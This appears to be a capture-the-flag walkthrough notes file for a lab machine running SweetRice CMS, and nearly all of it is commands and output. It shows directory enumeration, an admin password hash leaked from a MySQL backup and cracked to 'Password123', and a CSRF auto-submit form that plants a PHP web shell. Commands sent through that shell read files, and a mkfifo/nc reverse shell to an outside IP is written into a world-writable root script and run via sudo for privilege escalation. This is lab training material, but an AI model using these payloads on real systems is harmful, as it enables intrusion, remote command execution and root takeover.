```

dirb http://10.10.11.163/
---- Entering directory: http://10.10.11.163/content/ ----                                                                                                                             
==> DIRECTORY: http://10.10.11.163/content/_themes/                                                                                                                                    
==> DIRECTORY: http://10.10.11.163/content/as/                                                                                                                                         
==> DIRECTORY: http://10.10.11.163/content/attachment/                                                                                                                                 
==> DIRECTORY: http://10.10.11.163/content/images/                                                                                                                                     
==> DIRECTORY: http://10.10.11.163/content/inc/     
  
http://10.10.11.163/content/inc/mysql_backup/                                                                                                  

http://10.10.11.163/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql


 14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
  16 => 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',

42f749ade7f9e195bf475f37a44cafcb:Password123
manager, 

<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.11.163/content/as/?type=ad&mode=save"
method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked2"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
echo system($_GET['c']);?>
</textarea>
</form>
</body>
</html>



http://10.10.11.163/content/inc/ads/hacked2.php?c=cat%20%20/home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1acXXXXX}

http://10.10.11.163/content/inc/ads/hacked2.php?c=cat%20%20/home/itguy/mysql.txt
rice:randompass rice:randompass

Now tried to use a php reverse shell to get connect to our machine


$ sudo -l                                                                                                                                                                              
sudo -l                                                                                                                                                                                
Matching Defaults entries for www-data on THM-Chal:                                                                                                                                    
    env_reset, mail_badpass,                                                                                                                                                           
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                                           
                                                                                                                                                                                       
User www-data may run the following commands on THM-Chal:                                                                                                                              
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl   

$ cat /home/itguy/backup.pl
cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

Modified version
$ cat /etc/copy.sh
mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.22.251 4444 >/tmp/f

$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh

Removed rm /tmp/f ; error persists , so tried same but removed rm /tmp/f

$ echo "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.22.251 4444 >/tmp/f" > /etc/copy.sh
$ sudo /usr/bin/perl /home/itguy/backup.pl
mkfifo: cannot create fifo '/tmp/f': File exists

nc -nlvp 4444
THM{6637f41d0177b6f37cb20d77512XXXXX}
```
